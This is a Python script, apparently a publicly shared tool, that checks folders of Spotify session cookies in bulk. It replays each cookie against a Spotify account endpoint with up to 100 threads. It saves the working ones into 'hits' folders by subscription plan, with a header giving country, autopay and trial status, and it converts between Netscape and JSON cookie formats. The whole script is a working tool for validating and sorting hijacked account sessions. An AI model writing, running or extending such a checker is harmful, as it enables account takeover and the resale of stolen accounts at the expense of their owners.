import requests
import os
import colorama
import shutil
import keyboard
import json
import threading

colorama.init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def plan_name_mapping(plan):
    mapping = {
        "duo_premium": "Duo Premium",
        "family_premium_v2": "Family Premium",
        "premium": "Premium",
        "premium_mini": "Premium Mini",
        "student_premium": "Student Premium",
        "student_premium_hulu": "Student Premium + Hulu",
        "free": "Free"
    }
    return mapping.get(plan, "Unknown")

def format_cookie_file(data, cookie_content):
    plan = plan_name_mapping(data.get("currentPlan", "unknown"))
    country = data.get("country", "unknown")
    auto_pay = "True" if data.get("isRecurring", False) else "False"
    trial = "True" if data.get("isTrialUser", False) else "False"

    header = f"PLAN = {plan}\nCOUNTRY = {country}\nAutoPay = {auto_pay}\nTrial = {trial}\nChecker By: github.com/harshitkamboj\nSpotify COOKIE :👇\n\n\n"
    return header + cookie_content

def checkNetscapeCookies(num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}

    def checkCookie(cookie):
        try:
            cookie_path = os.path.join("cookies", cookie)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                read_cookie = f.read()

                cookies = {}
                for line in read_cookie.splitlines():
                    parts = line.strip().split('\t')
                    if len(parts) >= 7:
                        domain, _, path, secure, expires, name, value = parts[:7]
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer")

                if response.status_code == 200:
                    data = response.json()
                    current_plan = data.get("currentPlan", "unknown")

                    counts['hits'] += 1
                    print(colorama.Fore.GREEN + f"Login successful with {cookie}" + colorama.Fore.RESET)

                    output_folder = plan_name_mapping(current_plan).replace(" ", "_").lower()
                    os.makedirs(os.path.join("hits", output_folder), exist_ok=True)
                    
                    formatted_cookie = format_cookie_file(data, read_cookie)
                    with open(os.path.join("hits", output_folder, cookie), 'w', encoding='utf-8') as out_f:
                        out_f.write(formatted_cookie)

                else:
                    counts['bad'] += 1
                    print(colorama.Fore.RED + f"Login failed with {cookie}" + colorama.Fore.RESET)
        except Exception as e:
            counts['errors'] += 1
            print(colorama.Fore.RED + f"Error: {e} with {cookie}" + colorama.Fore.RESET)

    cookies = os.listdir("cookies")

    def worker():
        while True:
            try:
                cookie = cookies.pop(0)
            except IndexError:
                break

            checkCookie(cookie)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

def checkJsonCookies(num_threads=1):
    counts = {'hits': 0, 'bad': 0, 'errors': 0}

    def checkCookie(cookie_name):
        try:
            cookie_path = os.path.join("cookies", cookie_name)
            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = json.load(f)

                cookies = {}
                for cookie in cookies_json:
                    name = cookie.get('name')
                    value = cookie.get('value')
                    domain = cookie.get('domain')
                    path = cookie.get('path')
                    secure = cookie.get('secure', False)
                    expires = cookie.get('expires', None)

                    if name and value and domain and path:
                        cookies[name] = value

                session = requests.Session()
                session.cookies.update(cookies)
                session.headers.update({'Accept-Encoding': 'identity'})

                response = session.get("https://www.spotify.com/eg-ar/api/account/v1/datalayer")

                if response.status_code == 200:
                    data = response.json()
                    current_plan = data.get("currentPlan", "unknown")

                    counts['hits'] += 1
                    print(colorama.Fore.GREEN + f"Login successful with {cookie_name}" + colorama.Fore.RESET)

                    output_folder = plan_name_mapping(current_plan).replace(" ", "_").lower()
                    os.makedirs(os.path.join("hits", output_folder), exist_ok=True)
                    
                    formatted_cookie = format_cookie_file(data, json.dumps(cookies_json, indent=4))
                    with open(os.path.join("hits", output_folder, cookie_name), 'w', encoding='utf-8') as out_f:
                        out_f.write(formatted_cookie)

                else:
                    counts['bad'] += 1
                    print(colorama.Fore.RED + f"Login failed with {cookie_name}" + colorama.Fore.RESET)
        except Exception as e:
            counts['errors'] += 1
            print(colorama.Fore.RED + f"Error: {e} with {cookie_name}" + colorama.Fore.RESET)

    cookies = os.listdir("cookies")

    def worker():
        while True:
            try:
                cookie = cookies.pop(0)
            except IndexError:
                break

            checkCookie(cookie)

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker)
        threads.append(thread)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

    print("\n\nFinished Checking")
    print(f"Good: {counts['hits']} - Bad: {counts['bad']} - Errors: {counts['errors']}")
    input("Press enter to return\n")
    clear_screen()
    main()

def convertJsonToNetscape():
    print("Converting Json to Netscape...")
    clear_screen()

    def boolToString(s):
        if s:
            return "TRUE"
        else:
            return "FALSE"

    def checkTailMatch(s):
        if s[0] == ".":
            return "TRUE"
        return "FALSE"

    cookies = os.listdir('convert')
    for cookie in cookies:
        try:
            cookie_path = "convert/" + cookie

            data = json.loads(open(cookie_path, 'r', encoding='utf-8').read())
            write = open(f'converted/{cookie}', 'w', encoding='utf-8')

            for x in data:
                write.write(x["domain"] + '\t' + checkTailMatch(x["domain"]) + '\t' + x["path"] + '\t' + boolToString(x["secure"]) + '\t' + "0" + '\t' + x["name"] + '\t' + x["value"] + '\n')
        except Exception as e:
            print(f"Error: {e} with {cookie}")
            continue

    print("Completed converting cookies")
    input("Press enter to return\n")
    clear_screen()
    main()

def convertNetscapeToJson():
    print("Converting Netscape to Json...")
    clear_screen()

    def stringToBool(s):
        return s.upper() == "TRUE"

    cookies = os.listdir('convert')
    for cookie in cookies:
        try:
            cookie_path = "convert/" + cookie

            with open(cookie_path, 'r', encoding='utf-8') as f:
                cookies_json = []

                for line in f:
                    if line.strip() and not line.startswith("#"):
                        parts = line.strip().split('\t')
                        if len(parts) >= 7:
                            domain = parts[0]
                            tailmatch = parts[1]
                            path = parts[2]
                            secure = stringToBool(parts[3])
                            name = parts[5]
                            value = parts[6]

                            cookie_data = {
                                "domain": domain,
                                "tailmatch": tailmatch,
                                "path": path,
                                "secure": secure,
                                "name": name,
                                "value": value
                            }

                            cookies_json.append(cookie_data)

            with open(f'converted/{cookie}', 'w', encoding='utf-8') as f:
                json.dump(cookies_json, f, indent=4)

        except Exception as e:
            print(f"Error: {e} with {cookie}")
            continue

    print("Completed converting cookies")
    input("Press enter to return\n")
    clear_screen()
    main()

def main():
    print("""
██████████████████████████████████████████████████████████████████████████████████
█─▄▄▄▄█▄─▄▄─█─▄▄─█─▄─▄─█▄─▄█▄─▄▄─█▄─█─▄███─▄▄▄─█─█─█▄─▄▄─█─▄▄▄─█▄─█─▄█▄─▄▄─█▄─▄▄▀█
█▄▄▄▄─██─▄▄▄█─██─███─████─███─▄████▄─▄████─███▀█─▄─██─▄█▀█─███▀██─▄▀███─▄█▀██─▄─▄█
▀▄▄▄▄▄▀▄▄▄▀▀▀▄▄▄▄▀▀▄▄▄▀▀▄▄▄▀▄▄▄▀▀▀▀▄▄▄▀▀▀▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▀▄▄▀                                           
            by https://github.com/harshitkamboj                                                                     
    """)
    print("[1] Check Netscape Cookies")
    print("[2] Check Json Cookies")
    print("[3] Convert Netscape to Json")
    print("[4] Convert Json to Netscape")
    print("[esc] Exit")

    while True:
        if keyboard.is_pressed('1'):
            clear_screen()
            try:
                num_threads = int(input("Enter number of threads (1-100): "))
                if num_threads < 1 or num_threads > 100:
                    raise ValueError
            except ValueError:
                print("Invalid input")
                clear_screen()
                main()
            checkNetscapeCookies(num_threads)

        elif keyboard.is_pressed('2'):
            clear_screen()
            try:
                num_threads = int(input("Enter number of threads (1-100): "))
                if num_threads < 1 or num_threads > 100:
                    raise ValueError
            except ValueError:
                print("Invalid input")
                clear_screen()
                main()
            checkJsonCookies(num_threads)
        elif keyboard.is_pressed('3'):
            convertNetscapeToJson()
        elif keyboard.is_pressed('4'):
            convertJsonToNetscape()
        elif keyboard.is_pressed('esc'):
            exit()

if __name__ == "__main__":
    main()
